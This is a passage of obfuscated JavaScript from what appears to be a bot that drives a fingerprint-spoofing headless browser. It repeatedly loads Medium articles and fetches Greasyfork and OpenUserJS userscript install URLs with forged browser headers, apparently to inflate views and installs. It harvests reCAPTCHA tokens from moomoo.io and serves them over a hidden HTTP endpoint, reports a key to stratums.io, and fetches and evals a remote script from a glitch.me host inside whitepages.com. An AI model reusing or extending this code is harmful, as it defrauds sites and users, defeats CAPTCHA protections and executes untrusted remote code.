      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': W(0xb) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + W(0x3) + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + V(0x6)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + U(0xe, '[Z6N'),
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + W(0x0) + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x43 * 0x69 + -0x10 * 0xd0 + -0xe7b
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1 * 0x8aa + 0x2025 + 0x151 * -0x1f)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x24 * 0x2 + 0x1454 + -0x13a8), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x11 * -0xd3 + 0x163 * -0x19 + 0x150c), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const X = c,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1ec3 + -0x2 * 0x1c1 + 0x1 * -0x1b41;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u[X(0xc)](), await r['close'](), await q();
          for (let w = -0x1003 + -0x8 * 0x44 + -0x1223 * -0x1; w < getRandomInt(-0xcf7 * -0x1 + -0x348 * 0x7 + 0xb7 * 0xe, 0x515 + 0x195c + -0x1e6c); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x11bd5 + 0x5549 * 0x5 + 0x5bc8);
        }
      }();
    }, 0x1523 + 0x9a0 * -0x1 + -0x49 * 0x27), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Z = d,
        Y = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1617 + -0xf18 + 0xa7 * 0x39;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))[Y(0x14, 'Y6lH')]('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v[Z(0x8)](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1536 * 0x1 + -0x1e01 + 0x3337, -0x2070 + 0x1a8d + 0x9 * 0xad)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x5 * -0x966 + 0x6e9f + 0x358f);
    }, 0x1258 + 0x121 * -0x1f + 0x110b * 0x1), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0xbd6 + -0x1 * 0x1c96 + 0x10c0;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x2479 + -0x115f + 0x20c8 * 0x2), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1540 + 0x24c7 + -0x3a07), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x2 * -0x2d7a6 + -0x3247c * -0x7 + -0xdf310);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1243 + 0x121b + 0x8c);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xf1 * -0x10 + 0x1daa + -0xdd2);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1137 + 0x2107 + 0xfc0);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = d;
  async function f() {
    const a1 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x18f5 * -0x1 + 0x1032 * 0x1 + 0x1ca * -0x17) {
        const a0 = b;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1ebb * 0x1 + -0x868 + -0x1 * 0x1652));
        const C = A['indexOf'](a0(0xd, 'C58o')) + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x65 * -0x5d + -0x5 * -0x600 + 0x3f * -0x10f, D['indexOf']('\x20'));
        return B ? E['slice'](-0x847 * -0x1 + 0x26b5 + -0xc2 * 0x3e, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x5 * 0x24b + -0x37b1 * 0x1 + 0x534a),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers'][a1(0x13)]('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x2 * -0x26c6 + -0x1e9 * 0x7 + -0x191d),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      a2(0x11) + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + a2(0x5) + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
